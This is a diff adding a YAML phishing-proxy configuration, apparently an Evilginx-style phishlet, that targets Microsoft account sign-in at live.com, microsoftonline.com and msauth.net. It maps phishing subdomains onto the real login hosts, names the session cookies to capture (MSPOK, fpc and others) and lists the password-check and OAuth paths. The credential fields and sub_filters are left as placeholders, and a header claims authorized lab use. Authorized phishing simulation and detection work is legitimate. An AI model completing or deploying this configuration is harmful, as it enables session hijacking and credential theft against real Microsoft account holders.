@@ -1,0 +1,47 @@
+# AUTHORIZED LAB USE ONLY — capture-faithful documentation, not a guaranteed live deployment.
+# coverage: complete
+# 2 registrable domain(s) supplied cookie names.
+# 3 observed auth-like path(s) retained.
+# Complete credentials.search and sub_filters only after authorized lab review.
+name: lab_live_com
+min_ver: 3.0.0
+proxy_hosts:
+- phish_sub: login
+  orig_sub: login
+  domain: live.com
+  session: true
+  is_landing: true
+  auto_filter: true
+- phish_sub: login
+  orig_sub: login
+  domain: microsoftonline.com
+  session: true
+  is_landing: false
+  auto_filter: true
+- phish_sub: aadcdn
+  orig_sub: aadcdn
+  domain: msauth.net
+  session: false
+  is_landing: false
+  auto_filter: true
+auth_tokens:
+- domain: live.com
+  keys:
+  - MSPOK
+  - MSPRequ
+  - OParams
+  - OParams1
+- domain: microsoftonline.com
+  keys:
+  - fpc
+  - x-ms-gateway-slice
+auth_urls:
+- /checkpassword.srf
+- /common/GetCredentialType
+- /oauth20_authorize.srf
+login:
+  domain: live.com
+  path: /checkpassword.srf
+credentials: []
+sub_filters:
+- '{{PLACEHOLDER}}'
